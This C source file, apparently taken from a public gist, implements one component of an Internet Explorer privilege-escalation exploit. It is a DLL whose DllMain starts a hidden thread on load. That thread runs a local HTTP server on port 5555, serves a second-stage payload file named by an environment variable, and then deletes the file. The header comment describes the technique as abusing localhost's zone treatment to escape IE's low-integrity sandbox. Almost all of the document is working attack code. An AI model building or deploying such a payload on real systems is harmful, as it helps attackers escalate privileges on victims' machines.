/*
From: https://gist.github.com/worawit/1213febe36aa8331e092

Simple local HTTP server for IE (with no AppContainer) privilege escalation.

I implemented local server instead of proxy in Ref because 
local server is easier to code. But local server is less useful then proxy.

Ref:
http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/There-s-No-Place-Like-Localhost-A-Welcoming-Front-Door-To-Medium/ba-p/6560786#.U9v5smN5FHb

Note:
From my test, by default IE does not configure intranet site.
With this default, localhost is treated as internet site (run as low integrity).
*/
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_PORT 5555

static HANDLE hThread = NULL;

static WCHAR stage2file[256];

static SOCKET serverSk = INVALID_SOCKET;
static SOCKET peerSk = INVALID_SOCKET;

static SOCKET create_server()
{
	struct sockaddr_in skAddr;
	SOCKET sk;
	int optval;

	sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sk == INVALID_SOCKET)
		return INVALID_SOCKET;

	optval = 1;
	setsockopt(sk, SOL_SOCKET, SO_REUSEADDR, (char*) &optval, sizeof(optval));

	memset(&skAddr, 0, sizeof(skAddr));
	skAddr.sin_family = AF_INET;
	skAddr.sin_port = htons(SERVER_PORT);
	skAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

	if (bind(sk, (struct sockaddr *) &skAddr, sizeof(skAddr)) != 0)
		goto on_error;

	if (listen(sk, 5) != 0)
		goto on_error;

	return sk;

on_error:
	closesocket(sk);
	return SOCKET_ERROR;
}

static int send_all(SOCKET sk, char *buffer, int size)
{
	int len;
	while (size > 0) {
		len = send(sk, buffer, size, 0);
		if (len <= 0)
			return 0;
		buffer += len;
		size -= len;
	}

	return 1;
}

static int local_server()
{
	int len;
	int totalSize;
	char buffer[4096];
	HANDLE hFile = INVALID_HANDLE_VALUE;

	serverSk = create_server();
	if (serverSk == INVALID_SOCKET)
		return SOCKET_ERROR;

	while (1) {
		peerSk = accept(serverSk, NULL, NULL);
		if (peerSk == INVALID_SOCKET) {
			continue;
		}

		len = recv(peerSk, buffer, sizeof(buffer), 0);
		if (len <= 0)
			goto closepeer;

		hFile = CreateFile(stage2file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			break;

		totalSize = GetFileSize(hFile, NULL);
		if (totalSize == INVALID_FILE_SIZE)
			break;

		len = _snprintf(buffer, sizeof(buffer), 
			"HTTP/1.1 200 OK\r\n"
			"Content-Type: text/html\r\n"
			"Connection: Close\r\n"
			"Content-Length: %d\r\n"
			"\r\n",
			totalSize
		);
		send_all(peerSk, buffer, len);

		while (totalSize > 0) {
			ReadFile(hFile, buffer, sizeof(buffer), (DWORD*) &len, NULL);
			send_all(peerSk, buffer, len);
			totalSize -= len;
		}
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;

closepeer:
		closesocket(peerSk);
		peerSk = INVALID_SOCKET;
	}

	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}
	if (peerSk != INVALID_SOCKET) {
		closesocket(peerSk);
		peerSk = INVALID_SOCKET;
	}
	if (serverSk != INVALID_SOCKET) {
		closesocket(serverSk);
		serverSk = INVALID_SOCKET;
	}

	return 0;
}

DWORD WINAPI threadProc(void *param)
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2 ,2), &wsaData);

	local_server();

	WSACleanup();

	DeleteFile(stage2file);
	return 0;
}

void do_work()
{
	GetEnvironmentVariableW(L"stage2file", stage2file, sizeof(stage2file));

	hThread = CreateThread(NULL, 0, threadProc, NULL, 0, NULL);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		do_work();
		break;
	case DLL_PROCESS_DETACH:
		if (hThread) {
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
		}
		break;
	}
	return TRUE;
}
